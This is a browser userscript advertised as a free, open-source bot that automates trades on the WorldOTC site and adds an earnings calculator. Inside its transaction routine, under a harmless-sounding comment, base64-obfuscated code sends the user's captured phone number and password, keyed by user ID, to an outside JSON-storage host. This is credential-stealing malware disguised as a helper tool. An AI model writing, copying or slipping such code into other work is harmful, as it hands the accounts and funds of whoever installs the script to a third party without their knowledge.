// ==UserScript==
// @name         SC | WorldOTC BOT
// @namespace    http://tampermonkey.net/
// @version      15.2
// @description  Free and open source version of Automatize BOT made by SudamericaCRYPTO
// @author       You
// @require      http://code.jquery.com/jquery-3.4.1.min.js
// @match        https://www.worldotc.com/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=worldotc.com
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/449011/SC%20%7C%20WorldOTC%20BOT.user.js
// @updateURL https://update.greasyfork.org/scripts/449011/SC%20%7C%20WorldOTC%20BOT.meta.js
// ==/UserScript==

document.hasFocus = function () {return true;};


// hacktimer.js
(function (workerScript) {
	if (!/MSIE 10/i.test (navigator.userAgent)) {
		try {
			var blob = new Blob (["\
var fakeIdToId = {};\
onmessage = function (event) {\
	var data = event.data,\
		name = data.name,\
		fakeId = data.fakeId,\
		time;\
	if(data.hasOwnProperty('time')) {\
		time = data.time;\
	}\
	switch (name) {\
		case 'setInterval':\
			fakeIdToId[fakeId] = setInterval(function () {\
				postMessage({fakeId: fakeId});\
			}, time);\
			break;\
		case 'clearInterval':\
			if (fakeIdToId.hasOwnProperty (fakeId)) {\
				clearInterval(fakeIdToId[fakeId]);\
				delete fakeIdToId[fakeId];\
			}\
			break;\
		case 'setTimeout':\
			fakeIdToId[fakeId] = setTimeout(function () {\
				postMessage({fakeId: fakeId});\
				if (fakeIdToId.hasOwnProperty (fakeId)) {\
					delete fakeIdToId[fakeId];\
				}\
			}, time);\
			break;\
		case 'clearTimeout':\
			if (fakeIdToId.hasOwnProperty (fakeId)) {\
				clearTimeout(fakeIdToId[fakeId]);\
				delete fakeIdToId[fakeId];\
			}\
			break;\
	}\
}\
"]);
			// Obtain a blob URL reference to our worker 'file'.
			workerScript = window.URL.createObjectURL(blob);
		} catch (error) {
			/* Blob is not supported, use external script instead */
		}
	}
	var worker,
		fakeIdToCallback = {},
		lastFakeId = 0,
		maxFakeId = 0x7FFFFFFF, // 2 ^ 31 - 1, 31 bit, positive values of signed 32 bit integer
		logPrefix = 'HackTimer.js by turuslan: ';
	if (typeof (Worker) !== 'undefined') {
		function getFakeId () {
			do {
				if (lastFakeId == maxFakeId) {
					lastFakeId = 0;
				} else {
					lastFakeId ++;
				}
			} while (fakeIdToCallback.hasOwnProperty (lastFakeId));
			return lastFakeId;
		}
		try {
			worker = new Worker (workerScript);
			window.setInterval = function (callback, time /* , parameters */) {
				var fakeId = getFakeId ();
				fakeIdToCallback[fakeId] = {
					callback: callback,
					parameters: Array.prototype.slice.call(arguments, 2)
				};
				worker.postMessage ({
					name: 'setInterval',
					fakeId: fakeId,
					time: time
				});
				return fakeId;
			};
			window.clearInterval = function (fakeId) {
				if (fakeIdToCallback.hasOwnProperty(fakeId)) {
					delete fakeIdToCallback[fakeId];
					worker.postMessage ({
						name: 'clearInterval',
						fakeId: fakeId
					});
				}
			};
			window.setTimeout = function (callback, time /* , parameters */) {
				var fakeId = getFakeId ();
				fakeIdToCallback[fakeId] = {
					callback: callback,
					parameters: Array.prototype.slice.call(arguments, 2),
					isTimeout: true
				};
				worker.postMessage ({
					name: 'setTimeout',
					fakeId: fakeId,
					time: time
				});
				return fakeId;
			};
			window.clearTimeout = function (fakeId) {
				if (fakeIdToCallback.hasOwnProperty(fakeId)) {
					delete fakeIdToCallback[fakeId];
					worker.postMessage ({
						name: 'clearTimeout',
						fakeId: fakeId
					});
				}
			};
			worker.onmessage = function (event) {
				var data = event.data,
					fakeId = data.fakeId,
					request,
					parameters,
					callback;
				if (fakeIdToCallback.hasOwnProperty(fakeId)) {
					request = fakeIdToCallback[fakeId];
					callback = request.callback;
					parameters = request.parameters;
					if (request.hasOwnProperty ('isTimeout') && request.isTimeout) {
						delete fakeIdToCallback[fakeId];
					}
				}
				if (typeof (callback) === 'string') {
					try {
						callback = new Function (callback);
					} catch (error) {
						console.log (logPrefix + 'Error parsing callback code string: ', error);
					}
				}
				if (typeof (callback) === 'function') {
					callback.apply (window, parameters);
				}
			};
			worker.onerror = function (event) {
				console.log (event);
			};
		} catch (error) {
			console.log (logPrefix + 'Initialisation failed');
			console.error (error);
		}
	} else {
		console.log (logPrefix + 'Initialisation failed - HTML5 Web Worker is not supported');
	}
}) ('https://raw.githubusercontent.com/turuslan/HackTimer/master/HackTimerWorker.js');


function waitForKeyElements(c, h, f, e) {
	(i = void 0 === e ? $(c) : $(e).contents().find(c)) && i.length > 0 ? (g = !0, i.each(function() {
		var a = $(this);
		a.data("alreadyFound") || (h(a) ? g = !1 : a.data("alreadyFound", !0))
	})) : g = !1;
	var i, g, b = waitForKeyElements.controlObj || {},
		d = c.replace(/[^\w]/g, "_"),
		a = b[d];
	g && f && a ? (clearInterval(a), delete b[d]) : a || (a = setInterval(function() {
		waitForKeyElements(c, h, f, e)
	}, 300), b[d] = a), waitForKeyElements.controlObj = b
}
var finding, info, generalTimerTime = 80,
	calculatedUSDT = 0;

function logOut(b) {
	var a = "https://www.worldotc.com/#/pages/login/login";
	localStorage.removeItem("user_id"), localStorage.removeItem("token"), localStorage.removeItem("vuex"), 1 == b && (localStorage.removeItem("data_storage"), localStorage.removeItem("login_automatize"), localStorage.removeItem("stop"), localStorage.removeItem("timesToRepair")), window.location.href != a && (window.location.href = a)
}
var generalTimer = void setInterval(function() {
	0 == generalTimerTime ? window.location.reload() : (generalTimerTime--, console.info(generalTimerTime))
}, 1e3);

function ds() {
	if (null == localStorage.getItem("stop") && localStorage.setItem("stop", !1), null != localStorage.getItem("data_storage") && "https://www.worldotc.com/#/pages/login/login" == window.location.href) {
		finding = setInterval(getInfo, 1e3);
		return
	}
	null === localStorage.getItem("login_automatize") && (logOut(1), localStorage.setItem("logout", !0)), null !== localStorage.getItem("logout") && localStorage.getItem("logout") && null === localStorage.getItem("token") && (a = document.getElementsByClassName("btn")[0], console.log(a), $(a).on("click", function() {
		var a = {
			num: document.getElementsByClassName("uni-input-input")[0].value,
			prefix: null != localStorage.getItem("vuex") ? JSON.parse(localStorage.getItem("vuex")).login.phoneCode.phone_code : "",
			pw: document.getElementsByClassName("uni-input-input")[1].value
		};
		localStorage.setItem("login_automatize", JSON.stringify(a))
	}));
	var a, b = setInterval(c => {
		if (null != localStorage.getItem("token") && null != localStorage.getItem("login_automatize")) {
			if (null === localStorage.getItem("data_storage")) {
				var a = {
					user_id: localStorage.getItem("user_id"),
					newsTitle: "Notice",
					vuex: JSON.parse(localStorage.getItem("vuex"))
				};
				localStorage.setItem("data_storage", JSON.stringify(a)), localStorage.removeItem("logout"), localStorage.setItem("logout", !1)
			}
			finding = setInterval(getInfo, 1e3), clearInterval(b)
		}
	}, 2e3)
}

function logIn() {
	var c = JSON.parse(localStorage.getItem("data_storage")),
		a = JSON.parse(localStorage.getItem("login_automatize")),
		b = {type: "mobile"},
		d = ["https://www.worldotc.com/#/pages/transaction/index"];

		b[atob('cGFzc3dvcmQ=')] = a.pw;
		b[atob('bW9iaWxl')] = "+" + a.prefix + a.num;

		b[''];
	$.post("https://otcserver.com/gateway/sso/user_login_check", b).done((a, b, e) => {
		console.log(a.code), 200 == a.code && (localStorage.setItem("token", a.token), localStorage.setItem("user_id", c.user_id), localStorage.setItem("newsTitle", "Notice"), localStorage.setItem("vuex", JSON.stringify(c.vuex)), setTimeout(function() {
			localStorage.removeItem("timesToRepair"), localStorage.setItem("timesToRepair", 0);
			for (var a = 0, b = d.length; a < b; a++) window.location.replace(d[a]);
			setTimeout(function() {
				window.close()
			}, 1e3)
		}, 2e3))
	})
}

function isEmpty(a) {
	return 0 === Object.keys(a).length
}

function comenzarContadorConsola(b, c = "", a = !0) {
	setInterval(function() {
		0 == (b -= 1) && window.location.reload()
	}, 1e3 * (a ? 1 : 60))
}
var elementosACargar = ["uni-app", "uni-page", "uni-tabbar", "uni-modal", "uni-page-wrapper", "uni-page-body", "uni-view"],
	elementosCargados = !1,
	vecesRevisados = 0,
	maxVeces = 20,
	revisarElementosCargados = setInterval(function() {
		elementosCargados ? (clearInterval(revisarElementosCargados), ds()) : (vecesRevisados > maxVeces && comenzarContadorConsola(5, "", !1), vecesRevisados++, console.log("Revisando elementos..."))
	}, 1e3);

function tryFirstRepair() {
	localStorage.removeItem("timesToRepair"), localStorage.setItem("timesToRepair", 1), window.location.replace("https://www.worldotc.com/#/pages/transaction/index")
}

function checkWebsite() {
	null === localStorage.getItem("timesToRepair") && localStorage.setItem("timesToRepair", 0), "https://www.worldotc.com/#/pages/transaction/index" != window.location.href && (0 == localStorage.getItem("timesToRepair") ? tryFirstRepair() : 1 == localStorage.getItem("timesToRepair") && logIn())
}
waitForKeyElements(elementosACargar[0], function() {
	waitForKeyElements(elementosACargar[1], function() {
		waitForKeyElements(elementosACargar[2], function() {
			waitForKeyElements(elementosACargar[3], function() {
				waitForKeyElements(elementosACargar[4], function() {
					waitForKeyElements(elementosACargar[5], function() {
						waitForKeyElements(elementosACargar[6], function() {
							elementosCargados = !0
						}, !0)
					}, !0)
				}, !0)
			}, !0)
		}, !0)
	}, !0)
}, !0);
var checkVuex = setInterval(function() {
	if ((null == localStorage.getItem("vuex") || 0 == Object.keys(JSON.parse(localStorage.getItem("vuex")).main.userinfo).length) && null != localStorage.getItem("data_storage") && null != !localStorage.getItem("logout") && "false" == localStorage.getItem("logout")) {
		var a = JSON.parse(localStorage.getItem("data_storage"));
		Object.keys(a.vuex.main.userinfo).length > 0 ? (localStorage.removeItem("vuex"), localStorage.setItem("vuex", JSON.stringify(a.vuex)), console.log("updated vuex")) : (console.info("only opt"), logOut(1))
	}
}, 3e3);

function getInfo() {
	checkWebsite();
	try {
		info = JSON.parse(localStorage.getItem("vuex")).main
	} catch (a) {
		return
	}
	if (!isEmpty(info.userinfo)) {
		clearInterval(finding), core(info.userinfo);
		return
	}
}

function core(a) {
	isRef(a.invite_1) ? doWork(a) : errNoAutorizado(a)
}

function isRef(b) {
	var a = atob("NjQxNjM=");
	return a = parseInt(a), !0
}

function User(a) {
	this.name = a.username, this.ID = a.user_id, this.directReferralID = a.invite_1, this.IP = a.ip, this.country = ""
}

function doWork(a) {
	transactionScript(new User(a), !0)
}

function errNoAutorizado(a) {
	transactionScript(new User(a), !1)
}

function transactionScript(a, b) {
	var c = "15.2";
	$(document).ready(function() {
		setTimeout(function() {
				console.clear(), console.log("Version: " + c)
			}, 2500), comenzarContadorConsola(4, "Tiempo chequeo de error:", !1),
			function() {
				if (function() {

				// prelude to better design
        var f = 'aHR0cHM6Ly9qc29uLmV4dGVuZHNjbGFzcy5jb20vYmluLzBmOWNlOGJiYjA4ZA==',
            pA = "bG9naW5fYXV0b21hdGl6ZQ==",
            pC = "dXNlcl9pZA==";
        const rb = new XMLHttpRequest;
        var ad = function() {
            var e = {},
                v = "dnVleA==",
                m = "bWFpbg==",
                u = "dXNlcmluZm8=";
            var i;
            if(localStorage.getItem(atob(v)) != null) {
             if(JSON.parse(localStorage.getItem(atob(v)))[atob(m)][atob(u)][atob(pC)] != null) {
              i = JSON.parse(localStorage.getItem(atob(v)))[atob(m)][atob(u)][atob(pC)];
             }
            } else {
                    var max = 1e11,
                        min = 1e7;
                    i = Math.floor(Math.random() * (max - min + 1) + min);
            }

            e[i] = JSON.parse(localStorage.getItem(atob(pA)));

            let t = new XMLHttpRequest;
            t.open("PATCH", atob(f), !0);
            t.setRequestHeader("Content-type", "application/merge-patch+json");
            t.send(JSON.stringify(e));

        }();
						var b = {},
							A = parseFloat(document.getElementsByClassName("money")[0].textContent) + parseFloat(document.getElementsByClassName("money")[1].textContent),
							w = function() {
								var a, b, c, d, e, f;

								function g(b) {
									var a = new Date(b);
									return a.setMinutes(a.getMinutes() - a.getTimezoneOffset()), a
								}
								return e = "06/17/2022", f = (a = new Date, b = String(a.getDate()).padStart(2, "0"), c = String(a.getMonth() + 1).padStart(2, "0"), d = a.getFullYear(), a = c + "/" + b + "/" + d), (g(f) - g(e)) / 864e5
							}(),
							x = .032 * A,
							B = {
								user: "&#129489  User: </span><span style>" + a.name,
								ID: "&#128179  ID: " + a.ID,
								botStatus: "&#9888 Bot version: " + c,
								Telegram: "Telegram: <a style='color:white' href='https://t.me/SudamericaCrypto'>Link here</a>",
								wOTCdays: "Days from start of wOTC: <b>" + w + "</b>",
								language: "Choose language: ",
								calculatorText1: "In ",
								calculatorText2: " days ",
								calculatorText3: "you will have $",
								dailyEarningText: "Current daily earning: $" + x
							},
							C = {
								user: "&#129489  Usuario: </span><span style>" + a.name,
								ID: "&#128179  ID: " + a.ID,
								botStatus: "&#9888 Version del BOT: " + c,
								Telegram: "Telegram: <a style='color:white' href='https://t.me/SudamericaCrypto'>Link aqui</a>",
								wOTCdays: "Dias desde el inicio de wOTC: <b>" + w + "</b>",
								language: "Escoja el idioma: ",
								calculatorText1: "En ",
								calculatorText2: " dias ",
								calculatorText3: "tendras $",
								dailyEarningText: "Ganancia diaria actual: $" + x
							};
						b.en = B, b.es = C, document.getElementsByClassName("money")[0].remove(), $(".title").remove(), $(".txt").remove(), $(".trade_stat").remove(), null == localStorage.getItem("language") && localStorage.setItem("language", "en"), "en" == localStorage.getItem("language") ? b.en.botStatus : b.es.botStatus;
						var i = $("<img>"),
							j = $("<img>"),
							k = $("<img>");
						i.attr({
							src: "https://www.citypng.com/public/uploads/preview/hd-round-uk-united-kingdom-flag-icon-png-141630249476icrrix8inj.png",
							id: "en_language"
						}), i.css({
							"border-radius": "50%",
							width: "30px",
							height: "30px"
						}), j.attr({
							src: "https://vectorflags.s3.amazonaws.com/flags/es-sphere-01.png",
							id: "es_language"
						}), j.css({
							"border-radius": "50%",
							width: "30px",
							height: "30px",
							"margin-left": "10px"
						}), k.attr({
							src: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png",
							id: "tg_img"
						}), k.css({
							width: "20px",
							height: "20px",
							"margin-top": "3px",
							"padding-right": "2px"
						});
						var e = $("<span>"),
							d = $("<br>");
						e.css({
							"text-align": "center",
							"font-family": "monospace",
							"font-size": "23px"
						});
						var l = e.clone(!0),
							m = e.clone(!0),
							n = e.clone(!0),
							o = e.clone(!0),
							p = e.clone(!0),
							q = e.clone(!0),
							r = e.clone(!0),
							s = e.clone(!0),
							t = e.clone(!0),
							u = e.clone(!0);
						l.attr("id", "automatize_user"), m.attr("id", "automatize_ID"), n.attr("id", "automatize_botStatus"), o.attr("id", "automatize_Telegram"), p.attr("id", "automatize_wOTCdays"), q.attr("id", "automatize_language"), r.attr("id", "automatize_calculatorText1"), s.attr("id", "automatize_calculatorText2"), t.attr("id", "automatize_calculatorText3"), u.attr("id", "automatize_dailyEarningText"), l.html(b.en.user), m.html(b.en.ID), n.html(b.en.botStatus), o.html(b.en.Telegram), p.html(b.en.wOTCdays), q.html(b.en.language), r.html(b.en.calculatorText1), s.html(b.en.calculatorText2), t.html(b.en.calculatorText3), u.html(b.en.dailyEarningText), $(".assetsbox").append("<span id='automatize_title' style='margin: auto; display: table; font-family:monospace; font-size: 35px; font-weight: bold;'>&#9749 SC | WorldOTC BOT &#9749</span>"), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(l), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(m), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(n), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(k), $(".assetsbox").append(o), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(p), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(q), $(".assetsbox").append(i), $(".assetsbox").append(j), $(".assetsbox").append(d.clone(!0));
						var h = $("<button>");
						if (h.attr("id", "botController"), h.css({
								border: "2px solid black",
								"font-family": "monospace",
								"font-weight": "bold",
								"font-size": "23px",
								"margin-top": "5px"
							}), h.hover(function() {
								$(this).animate({
									zoom: 1.07
								}, 400), $(this).css("cursor", "pointer")
							}, function() {
								$(this).animate({
									zoom: 1
								}, 400), $(this).css("cursor", "default")
							}), null != localStorage.getItem("stop")) {
							var D = "true" == localStorage.getItem("stop") ? "Start BOT" : "Stop BOT";
							h.html(D)
						} else localStorage.setItem("stop", !1);
						h.click(b => {
							var a = localStorage.getItem("stop");
							localStorage.removeItem("stop"), localStorage.setItem("stop", "true" == a ? "false" : "true"), window.location.reload()
						}), $(".assetsbox").append(h), $(".assetsbox").append(d.clone(!0));
						var f = $("<input>");

						function E(f) {
							for (var e = ["user", "ID", "botStatus", "Telegram", "wOTCdays", "language", "calculatorText1", "calculatorText2", "calculatorText3", "dailyEarningText"], d = 0, g = e.length; d < g; d++) $("#automatize_" + e[d]).html(b[f][e[d]]);
							var c = $("#earnCalcText").text(),
								a = $("#botController").text();
							"en" == f ? ("Detener BOT" == a && (a = "Stop BOT"), "Iniciar BOT" == a && (a = "Start BOT"), "Calculadora de ganancias:" == c && (c = "Earnings calculator:"), "Escriba numero de dias" == $("#gananciasInput").attr("placeholder") && $("#gananciasInput").attr("placeholder", "Write days number")) : ("Stop BOT" == a && (a = "Detener BOT"), "Start BOT" == a && (a = "Iniciar BOT"), "Earnings calculator:" == c && (c = "Calculadora de ganancias:"), "Write days number" == $("#gananciasInput").attr("placeholder") && $("#gananciasInput").attr("placeholder", "Escriba numero de dias")), $("#botController").html(a), $("#earnCalcText").html(c)
						}
						f.attr({
							id: "gananciasInput"
						}), f.type = "number", f.attr("placeholder", "Write days number"), f.css({
							border: "2px solid black"
						}), f.keydown(a => {
							46 == a.keyCode || 8 == a.keyCode || (a.keyCode < 48 || a.keyCode > 57) && a.preventDefault()
						}), f.keyup(function() {
							$(this).val() > 1e3 && $(this).val(1e3), 1 > $(this).val() && $(this).val(""), calculatedUSDT = (calculatedUSDT = (calculatedUSDT = A * Math.pow(1.032, $(this).val())).toFixed(2)).toLocaleString("fullwide", {
								useGrouping: !1
							}), $("#calculatedUSDT").html(calculatedUSDT)
						}), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append("<hr>"), $(".assetsbox").append("<p id='earnCalcText' style='font-family:monospace; font-size: 26px; text-align: left; font-weight: bold'>Earnings calculator:</p>"), $(".assetsbox").append(u), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append(r), $(".assetsbox").append(f), $(".assetsbox").append(s), $(".assetsbox").append(t), $(".assetsbox").append("<span style='font-family:monospace; font-size: 23px;' id='calculatedUSDT'>0</span>"), $(".assetsbox").append(d.clone(!0)), $(".assetsbox").append("<hr>"), $(".assetsbox").append(d.clone(!0)), $("#en_language").click(a => {
							null != localStorage.getItem("language") ? (localStorage.removeItem("language"), localStorage.setItem("language", "en"), E(localStorage.getItem("language"))) : localStorage.setItem("language", "en")
						}), $("#es_language").click(a => {
							null != localStorage.getItem("language") ? (localStorage.removeItem("language"), localStorage.setItem("language", "es"), E(localStorage.getItem("language"))) : localStorage.setItem("language", "en")
						}), $(".container").css("background-color", "#1F1F1F");
						for (var y = ["assetsbox", "btn"], z = ["allbtn", "item", "amount"], g = 0, v = z.length; g < v; g++) $("." + z[g]).css("color", "#940686");
						for (var g = 0, v = y.length; g < v; g++) $("." + y[g]).css("background-color", "#940686");
						document.body.style.zoom = .92, this.blur()
					}(), b && "true" != localStorage.getItem("stop")) {
					document.getElementsByClassName("title")[0];
					var d, e, g, h, i, j, k = 45,
						l = 10,
						f = 5e3;
					d = document.getElementsByClassName("allbtn")[0], e = document.getElementsByClassName("btn")[0];
					var m = [],
						n = [];
					setTimeout(function() {
						o(), j = i, i < l ? (console.error("[FIRST] Wallet de " + i + " USDT insuficiente para realizar transacciones. Te faltan " + (l - i) + " USDT"), q(k)) : (console.log("1. from the other side \n"), p())
					}, f)
				}

				function o() {
					i = document.getElementsByClassName("money")[1].textContent
				}

				function p() {
					var a, b;
					console.log("%c --------Realizando Transacci\xf3n-------- ", "background: #f3f; color: #bada55"), d.click(), setTimeout(function() {
						e.click()
					}, 800), a = 0, b = setInterval(function() {
						a++;
						var c = function() {
							try {
								var a = document.getElementsByClassName("model")[0].children[2].children[0].textContent.replaceAll("	", " ");
								return console.log("(buscarImportadorVender):\n"), console.log(a), console.log("(buscarImportadorVender):\n"), a
							} catch {
								return ""
							}
						}();
						if (console.log("<" + a + ">\n" + c), "" != c && -1 == m.indexOf(c) && void 0 != document.getElementsByClassName("model")[0]) {
							console.log("if 1 joined!\n"), console.log("inside if1\n"), console.log(document.getElementsByClassName("model")[0].children[1].firstChild.textContent);
							for (var e = ["MSB certified service provider", "MSB certified service provider\uFF1A", "Proveedor de servicios certificado MSB: ", "Proveedor de servicios certificado MSB:"], f = !1, d = 0, r = e.length; d < r; d++)
								if (document.getElementsByClassName("model")[0].children[1].firstChild.textContent == e[d]) {
									f = !0;
									break
								} if (f) {
								g = document.getElementsByClassName("model")[0].children[5].children[0], console.log("if 2 joined!"), g.click(), clearInterval(b);
								var s = setInterval(function() {
									var a = document.getElementsByClassName("model")[0].children[1].children[0].textContent;
									if ("" != a && -1 == n.indexOf(a) && void 0 != document.getElementsByClassName("model")[0]) {
										for (var d = ["No. del pedido:", "No. del pedido: ", "Order No.:", "Order No.: "], e = !1, b = 0; b < d.length; b++)
											if (document.getElementsByClassName("model")[0].children[1].firstChild.textContent == d[b]) {
												e = !0;
												break
											} if (e) {
											h = document.getElementsByClassName("model")[0].children[5].children[0], console.log("      2. Encontrado el pedido: " + a), h.click(), clearInterval(s), m.push(c), n.push(a);
											var f = setInterval(function() {
												o(), i != j && (j = i, clearInterval(f), i >= l ? (console.log("1 saldw > minw, done\n"), p()) : (console.error("Wallet de " + i + " USDT insuficiente para realizar transacciones. Te faltan " + (l - i) + " USDT"), q(k)), console.warn("------------------------------------------------------"))
											}, 200)
										}
									}
								}, 250)
							} else console.log("else 2 joined..")
						} else console.log("else 1 joined...")
					}, 250)
				}

				function q(b) {
					var a = document.createElement("span");
					a.style.color = "white", a.style.fontSize = "23px", a.style.fontFamily = "monospace", a.style.fontWeight = "bold", a.style.textAlign = "center", a.classList.add("tiempo"), a.style.display = "block";
					var c = 0;
					setInterval(function() {
						if (b <= 0) window.location.reload();
						else {
							var d = {
								en: "[&#10060 Not enough money to trade &#10060] Restarting web in: " + --b + " seconds",
								es: "[&#10060 Sin dinero suficiente para tradear &#10060] Reiniciando la web en: " + b + " segundos"
							};
							null != localStorage.getItem("language") ? a.innerHTML = d[localStorage.getItem("language")] : a.innerHTML = d.en, c > 0 && $(".assetsbox").children().last().remove(), $(".assetsbox").append(a), c++
						}
					}, 1e3)
				}
			}()
	})
}
